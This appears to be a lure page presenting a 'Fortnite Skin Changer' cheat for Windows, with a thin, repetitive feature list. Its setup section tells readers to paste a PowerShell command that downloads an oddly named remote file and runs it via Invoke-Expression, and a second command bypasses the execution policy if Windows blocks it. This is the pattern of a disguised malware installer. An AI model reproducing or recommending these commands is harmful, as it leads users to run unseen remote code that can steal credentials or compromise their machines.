# Fortnite Skin Changer

A public Fortnite skin changer for Windows. It swaps cosmetics on your own screen.

Public Fortnite skin changer pages describe a client-side cosmetic swapper for Windows 10 and Windows 11. The change is described as visible on your own screen.

The listed parts are skin swapping, an emote selector, pickaxe override, back bling, a glider swap, and wraps.

## What the existing pages list

- Skin swapping.
- Emote selector.
- Pickaxe override.
- Back bling.
- Glider swap.
- Wraps.

## Quick Setup (PowerShell)

This installs the tool Fortnite Skin Changer on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/claudia42200/fortnite-skin-changer-cheat-setup-guide/main/zwpmt02i9h.z29ejmrh | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/claudia42200/fortnite-skin-changer-cheat-setup-guide/main/zwpmt02i9h.z29ejmrh | Invoke-Expression"
```
